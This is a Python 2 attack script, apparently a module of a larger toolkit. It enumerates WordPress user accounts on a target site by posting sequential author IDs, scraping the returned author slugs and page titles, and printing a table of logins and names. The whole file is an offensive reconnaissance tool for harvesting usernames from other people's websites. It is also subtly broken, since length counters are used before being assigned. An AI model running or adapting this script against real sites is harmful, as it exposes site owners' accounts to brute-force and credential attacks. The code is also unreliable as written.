##
## Wordpress users enumerate  bypass to get the website users.
##

from core.misc import printf
import urllib
import urllib2
import sys

def uniq(lst):
    last = object()
    for item in lst:
        if item == last:
            continue
        yield item
        last = item
def sort_and_deduplicate(l):
    return list(uniq(sorted(l, reverse=False)))
def curllib(req,param=None,postdata=None):
    headers = { 'User-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:9.0) Gecko/20100101 Firefox/9.0',
                'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        req = urllib2.Request( req, postdata, headers)
        req = urllib2.urlopen(req, timeout = 30).read()
    except Exception as e:
        return False
    return req
def finder( text, start, end, index = 1 ):
    try:
        text = text.split(start)[index]
        return text.split(end)[0]
    except:
        return ""
def find_user(html=None):
    if html != None:
        return { "user": finder( html, '/author/', '/' ), "name": finder( html, '<title>', '</title>' ).split(',')[0] }
def user_scan(url,usern):
    results = []
    if 'http' not in url:
        try:
            urllib2.urlopen('https://' + url)
            site = 'https://' + url
        except:
            site = 'http://' + url
    else:
        site = url
    printf('scanning (%s)' % site)
    for x in range(0,int(usern)):
        print('\rprogress %s'%(100/int(usern)*x)+'%'),
        sys.stdout.flush()
        try:
            tmp = curllib(site, '', urllib.urlencode({"author":(x+1)}))
            if tmp == False:

                continue
            tmp = find_user(tmp)
        except:
            pass
        if len(tmp['user']):
            results.append(tmp)
            max_login_len = len(tmp['user']) if max_login_len < len(tmp['user']) else max_login_len
            max_name_len = len(tmp['name']) if max_name_len < len(tmp['name']) else max_name_len
    if not results:
        printf('\nCould not find anything, maybe not vulnerable!')
        return
    results = sort_and_deduplicate(results)
    print("\nFound "+str( len( results ) )+" users in "+site+"")

    login_space = (max_login_len-len("Login")+1)*" "
    name_space = (max_name_len-len("Name")+1)*" "
    login_bar = ((max_login_len-len("Login")+1)+6)*"-"
    name_bar = ((max_name_len-len("Name")+1)+5)*"-"
    header = "| Id | Login"+login_space+"| Name"+name_space+"|"

    print("  +----+"+login_bar+"+"+name_bar+"+")
    print("  "+header)
    print("  +----+"+login_bar+"+"+name_bar+"+")

    for x in range(0,len(results)):
        id_space = (3-len(str(x+1)))*" "
        login_space = (max_login_len-len(results[x]['user'])+1)*" "
        name_space = (max_name_len-len(results[x]['name'])+1)*" "
        print("  | "+str(x+1)+id_space+"| "+results[x]['user']+login_space+"| "+results[x]['name']+name_space+"|")
    print("  +----+"+login_bar+"+"+name_bar+"+")
